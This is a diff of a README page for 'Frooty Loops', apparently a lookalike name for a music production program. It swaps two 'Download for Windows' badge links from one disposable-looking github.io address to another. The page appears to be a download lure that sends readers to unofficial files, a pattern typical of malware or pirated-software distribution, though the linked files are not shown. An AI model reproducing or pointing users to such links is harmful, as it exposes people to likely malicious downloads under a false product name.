@@ -4,7 +4,7 @@
 
 ## 📥 Download Frooty Loops for Windows
 
-[![⬇️ Download Frooty Loops](https://img.shields.io/badge/Download-Frooty%20Loops-blue?style=for-the-badge&logo=windows)](https://hiopal3847.github.io/.github/24)
+[![⬇️ Download Frooty Loops](https://img.shields.io/badge/Download-Frooty%20Loops-blue?style=for-the-badge&logo=windows)](https://frootyloopsload.github.io/.github/)
 
 ---
 
@@ -30,7 +30,7 @@ Frooty Loops includes a variety of features such as a powerful step sequencer, a
 
 With its streamlined workflow, Frooty Loops allows users to bring their musical ideas to life quickly and efficiently. It's widely used by electronic music producers, hip-hop artists, and beatmakers.
 
-[![⬇️ Download Frooty Loops](https://img.shields.io/badge/Download-Frooty%20Loops-blue?style=for-the-badge&logo=windows)](https://hiopal3847.github.io/.github/24)
+[![⬇️ Download Frooty Loops](https://img.shields.io/badge/Download-Frooty%20Loops-blue?style=for-the-badge&logo=windows)](https://frootyloopsload.github.io/.github/)
 
 ---
 
